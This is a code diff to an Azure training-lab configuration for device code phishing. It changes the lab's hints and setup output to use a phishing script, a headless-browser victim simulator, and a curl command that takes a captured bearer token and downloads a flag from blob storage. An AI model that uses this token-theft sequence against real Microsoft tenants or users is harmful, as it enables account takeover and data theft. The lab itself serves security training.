@@ -17,9 +17,9 @@ class ApplicationConfiguration(ApplicationConfigurationAbstract):
 
     def get_hints(self):
         return {
-            1: "Initiate a device code flow with 'az login --use-device-code --allow-no-subscriptions'. You will get a URL and a one-time code. In a separate browser session, log in as the victim user using that code — this simulates the victim clicking a phishing link.",
-            2: "Once the victim authenticates, your CLI session now holds their access token. Run 'az storage account list' to find storage accounts accessible to the victim, then list the blobs: 'az storage blob list --account-name <name> --container-name sensitive-data --auth-mode login'.",
-            3: "Download the flag with: az storage blob download --account-name <storage_account> --container-name sensitive-data --name flag.txt --file - --auth-mode login",
+            1: "Navigate to the lab's tools/ directory and run phish.py with your tenant domain. It initiates a device code flow and prints a realistic phishing message with the user code. Keep this terminal open — it polls for the victim's token.",
+            2: "In a second terminal, run victim_simulator.py with the user code printed by phish.py and the victim credentials provided above. It uses a headless browser to automatically complete the device code authentication as the victim (requires: pip install playwright && playwright install chromium).",
+            3: "Once phish.py prints 'TOKEN CAPTURED', use the saved token to read the flag: TOKEN=$(python3 -c \"import json; d=json.load(open('/tmp/dcp_token.json')); print(d['access_token'])\") && curl -H \"Authorization: Bearer $TOKEN\" -H \"x-ms-version: 2020-04-08\" \"https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt\"",
         }
 
     def get_flag(self):
@@ -37,11 +37,19 @@ class ApplicationConfiguration(ApplicationConfigurationAbstract):
         print("[4] Storage account    : " + output["storage_account_name"]["value"])
         print("[5] Container name     : " + output["container_name"]["value"])
         print("")
-        print("Simulate the phishing attack:")
-        print("  az login --use-device-code --allow-no-subscriptions")
-        print("  # Open the URL shown, enter the code, then log in as the victim user above.")
-        print("  az storage blob download \\")
-        print("    --account-name {} \\".format(output["storage_account_name"]["value"]))
-        print("    --container-name {} \\".format(output["container_name"]["value"]))
-        print("    --name flag.txt --file - --auth-mode login")
+        print("Step 1 — Install the victim simulator dependency (once):")
+        print("  pip install playwright && playwright install chromium")
+        print("")
+        print("Step 2 — Terminal 1: run the phishing tool")
+        print("  cd app/cumulonimbus/applications/azure/device_code_phishing/tools")
+        print("  python3 phish.py --tenant {}".format(output["domain_name"]["value"]))
+        print("")
+        print("Step 3 — Terminal 2: run the victim simulator")
+        print("  python3 victim_simulator.py \\")
+        print("      --tenant   {} \\".format(output["domain_name"]["value"]))
+        print("      --code     <USER_CODE from Terminal 1> \\")
+        print("      --username {} \\".format(output["user_name"]["value"]))
+        print("      --password '{}'".format(output["user_password"]["value"]))
+        print("")
+        print("Step 4 — Use the captured token to read the flag from the storage account.")
         self.print_mitre_ttps()
